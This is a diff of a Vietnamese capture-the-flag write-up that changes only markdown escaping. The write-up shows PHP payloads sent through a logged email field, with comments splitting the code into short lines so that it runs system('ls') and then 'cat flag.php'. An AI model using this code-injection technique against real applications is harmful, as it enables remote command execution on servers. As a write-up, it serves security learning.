@@ -18,25 +18,25 @@ Có thể thấy khi chúng ta thay đổi email, thông tin sẽ được log l
 
 Gửi các dòng như sau:
 &lt;?php /*
-*/$a=/*
-*/'ls';/*
-*/system/*
-*/($a)/*
-*/;?&gt;
+\*/$a=/*
+\*/'ls';/*
+\*/system/*
+\*/($a)/*
+\*/;?&gt;
 với parameter là email, vào log ta sẽ được:
 
 ![alt text](https://raw.githubusercontent.com/Alic3Margatroid/ctfsv/master/10char/ls.PNG)
 
 Tương tự như trên, gửi các dòng
 &lt;?php /*
-*/$a=/*
-*/'cat '/*
-*/.'fla'/*
-*/.'g.p'/*
-*/.'hp';/*
-*/system/*
-*/($a)/*
-*/;?&gt;
+\*/$a=/*
+\*/'cat '/*
+\*/.'fla'/*
+\*/.'g.p'/*
+\*/.'hp';/*
+\*/system/*
+\*/($a)/*
+\*/;?&gt;
 để đọc flag.php sẽ được:
 
 ![alt text](https://raw.githubusercontent.com/Alic3Margatroid/ctfsv/master/10char/flag.PNG)
